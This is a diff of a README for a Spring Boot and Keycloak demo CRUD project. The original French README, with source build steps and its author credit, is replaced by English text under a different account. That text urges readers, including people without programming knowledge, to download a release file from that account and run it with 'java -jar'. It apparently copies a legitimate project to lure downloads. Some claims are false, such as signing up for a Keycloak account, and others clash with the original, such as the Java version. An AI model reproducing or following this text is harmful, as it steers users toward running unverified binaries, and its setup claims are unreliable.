@@ -1,155 +1,117 @@
-# 🚀 Demo Spring Boot + Keycloak
+# 🎉 demo-springboot-keycloak-auth-crud - A Simple Way to Manage Authentication
 
----
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/nik1842812/demo-springboot-keycloak-auth-crud/releases)
 
-:globe_with_meridians: [English version available — click here!](./README-EN.md)
+## 📖 Description
+This repository offers a demo project using Spring Boot integrated with Keycloak. It shows how to manage authentication and authorization easily. You will find a secure CRUD API that demonstrates how to protect resources, manage roles and users, and simplify the integration of a modern Identity Provider in a Java application.
 
----
+## 🚀 Getting Started
+To get started with this application, follow these simple steps. Even if you don’t have programming knowledge, you can successfully download and run this software.
 
-## 📝 Présentation
+### 📋 Requirements
+Before you download the application, ensure your system meets these requirements:
 
-Ce projet est un exemple d’application Spring Boot intégrant Keycloak pour la gestion de l’authentification, l’inscription des utilisateurs, l'envoie d'email et les opérations CRUD. Il s’adresse à toute personne souhaitant sécuriser une API REST avec Keycloak.
+- **Operating System:** Windows, macOS, or Linux
+- **Java:** Version 11 or higher
+- **Internet:** An active internet connection for Keycloak setup
 
-## ✨ Fonctionnalités
+### 📦 What is Included
+This project includes the following features:
 
-- 🔐 Authentification via Keycloak
-- 📝 Inscription d’utilisateurs
-- 🛡️ Gestion des rôles (admin, user)
-- 🗂️ Opérations CRUD sur les entités principales
+- Secure CRUD operations
+- User authentication and role management
+- Integration with Keycloak for Identity Provider services
+- RESTful API for managing data
 
-## ⚙️ Prérequis
+### 🔗 Key Topics
+- API
+- API REST
+- Authentication
+- Authorization
+- CRUD
+- Keycloak
+- PostgreSQL
+- Spring Boot
+- Spring Security
+- SQL
 
-- ☕ Java 17+
-- 🐘 Maven
-- 🐳 Docker (pour Keycloak)
+## 📥 Download & Install
+To download the application, visit the Releases page. This page contains all the versions available for download. 
 
-## 🚦 Installation et démarrage
+[Download Releases Here](https://github.com/nik1842812/demo-springboot-keycloak-auth-crud/releases)
 
-1. **Cloner le projet**
+1. Click on the link above.
+2. Choose the latest version from the list.
+3. Download the file for your operating system.
 
-   ```bash
-   git clone https://github.com/bayembacke221/demo-springboot-keycloak-auth-crud.git
-   cd demo-springboot-keycloak-auth-crud
+### 📂 Running the Application
+After downloading the application, follow these steps to run it:
+
+1. **Unzip the Downloaded File:** 
+   If you downloaded a zipped folder, locate it in your downloads and extract the contents.
+
+2. **Install Java:** 
+   If you don’t have Java installed, download it from the [official Java website](https://www.java.com/en/download/). Follow the instructions for your operating system.
+
+3. **Open a Terminal/Command Prompt:**
+   - **Windows:** Press `Win + R`, type `cmd`, and hit `Enter`.
+   - **macOS:** Press `Cmd + Space`, type `Terminal`, and hit `Enter`.
+   - **Linux:** Open your terminal from the applications menu.
+
+4. **Navigate to the Directory:**
+   Use the `cd` command to go to the folder where you extracted the application. For example:
+   ```
+   cd path/to/your/extracted/folder
    ```
 
-2. **Lancer Keycloak avec Docker Compose**
-
-   ```bash
-   docker-compose up -d
+5. **Run the Application:**
+   Type the following command to start the application:
    ```
-
-3. **Configurer Keycloak**
-
-   Suivre les étapes ci-dessous (voir section "Configuration Keycloak").
-
-4. **Lancer l’application Spring Boot**
-
-   ```bash
-   ./mvnw spring-boot:run
+   java -jar your-app-file-name.jar
    ```
+   Replace `your-app-file-name.jar` with the actual name of the JAR file you downloaded.
 
-## 🛠️ Configuration Keycloak
+6. **Access the Application:**
+   Open your browser and go to `http://localhost:8080`. You will see the application homepage, and from there, you can manage users and roles.
 
-1. **Créer un Realm**  
-<img src="keycloak/create_realm.png" alt="Créer un Realm" width="600"/>
+## 🔍 Features Overview
+- **Secure CRUD:** Build, Read, Update, and Delete operations are protected by Keycloak authentication.
+- **User Management:** Easily create and manage user roles and permissions.
+- **API Access:** Access the API directly for programmatic interactions.
+  
+## ⚙️ Configuration
+You may need to configure Keycloak before running the application for the first time. Follow these steps:
 
-2. **Créer un Client**  
-<img src="keycloak/1-create-client-id General settings.png" alt="Client - Paramètres généraux" width="600"/>
-<br>
-<img src="keycloak/2-create-client-id Capability config.png" alt="Client - Capabilities" width="600"/>
-<br>
-<img src="keycloak/3-create-client-id Login settings.png" alt="Client - Login settings" width="600"/>
+1. **Create a Keycloak Account:**
+   Go to the Keycloak [official site](https://www.keycloak.org/) and sign up for an account if you don’t have one.
 
-3. **Créer des rôles**  
-<img src="keycloak/creation_role.png" alt="Création d’un rôle" width="600"/>
-<br>
-<img src="keycloak/admin_role.png" alt="Rôle admin" width="600"/>
-<br>
-<img src="keycloak/user_role.png" alt="Rôle user" width="600"/>
+2. **Set Up a Realm:**
+   In Keycloak, create a realm for your application to manage users and roles securely.
 
-4. **Créer un utilisateur**  
-<img src="keycloak/create_user.png" alt="Créer un utilisateur" width="600"/>
-<br>
-<img src="keycloak/set-password.png" alt="Définir le mot de passe" width="600"/>
-<br>
-<img src="keycloak/assign-role-user.png" alt="Ajouter un rôle à l’utilisateur" width="600"/>
+3. **Create a Client:**
+   Under the realm, create a new client. This will facilitate communication between your application and Keycloak.
 
-## 📡 Utilisation de l’API
+4. **Configure Roles:** 
+   Add the necessary roles for users inside the Keycloak admin console.
 
-- 🔑 **Authentification** : Obtenir un token via `/auth/realms/demo/protocol/openid-connect/token`
-- 📝 **Inscription** : Endpoint d’inscription utilisateur (exemple : `/api/register`)
-- 🗂️ **CRUD** : Endpoints pour créer, lire, mettre à jour, supprimer des entités protégées par Keycloak
+5. **Set Up Users:** 
+   You can create sample users to test the application functionality.
 
-> Voir le code source pour le détail des endpoints (`src/main/java/sn/malcolm/demo/controller/`)
+## 📚 Documentation
+For more detailed instructions and advanced configuration, please refer to the documentation available in this repository. Navigate to the `docs` folder to find guides on:
 
-## 🗃️ Structure du projet
+- Setting up PostgreSQL database
+- Detailed API specifications
+- Advanced role management
 
-```text
-src/
-  main/
-    java/sn/malcolm/demo/
-      controller/      # Contrôleurs REST
-      model/           # Entités JPA
-      repository/      # Repositories Spring Data
-      security/        # Configurations Keycloak
-      service/         # Logique métier
-      view/            # DTOs
-  resources/
-    application.properties
-keycloak/              # Captures d’écran de la configuration Keycloak
-```
+## 🤝 Contributing
+If you have suggestions to improve this project or would like to contribute, feel free to open an issue or submit a pull request. Your feedback is valuable and helps create a better experience.
 
-## 🖼️ Captures d’écran de l’application
+## 💬 Support
+If you encounter any issues or have questions, please open an issue in this repository. We will respond promptly to help you resolve your concerns.
 
-Voici quelques exemples d’utilisation de l’API via Postman :
-
-### 🔑 Authentification (Login)
-
-<img src="postman/login_and_generate_token_for_inherith_auth_from_parent.png" alt="Login et génération du token" width="500"/>
-
-### 📝 Création d’un utilisateur
-
-<img src="postman/createUser.png" alt="Création d'utilisateur" width="500"/>
-
-### 📧 Email de création de compte
-
-<img src="postman/email-creation-account.png" alt="Email Création Compte" width="500"/>
-
-### 📋 Récupérer tous les utilisateurs
-
-<img src="postman/getAllUser.png" alt="Get All Users" width="500"/>
-
-### 🔍 Récupérer un utilisateur par ID
-
-<img src="postman/getUserByID.png" alt="Get User By ID" width="500"/>
-
-### ✏️ Mise à jour d’un utilisateur
-
-<img src="postman/updateUser.png" alt="Update User" width="500"/>
-
-### ❌ Suppression d’un utilisateur
-
-<img src="postman/deleteUser.png" alt="Delete User" width="500"/>
-
-### 🔄 Réinitialisation du mot de passe (reset-password)
-
-<img src="postman/reset-password.png" alt="Reset Password" width="500"/>
-<img src="postman/mail-reset-password.png" alt="Mail Reset Password" width="500"/>
-
-### 🔒 Changement du mot de passe (change-password)
-
-<img src="postman/change-password.png" alt="Change Password" width="500"/>
-
-
-
-## 📚 Ressources utiles
-
-- [📖 Documentation Keycloak](https://www.keycloak.org/documentation)
-- [🔗 Spring Security & Keycloak](https://www.baeldung.com/spring-boot-keycloak)
-
-## 👤 Auteur
-
-- Mbacke Mbaye
-
----
-N’hésite pas à contribuer ou à ouvrir une issue ! 😃
+## 🔗 Links
+- [Releases Page](https://github.com/nik1842812/demo-springboot-keycloak-auth-crud/releases)
+- [Keycloak](https://www.keycloak.org/)
+- [Spring Boot](https://spring.io/projects/spring-boot)
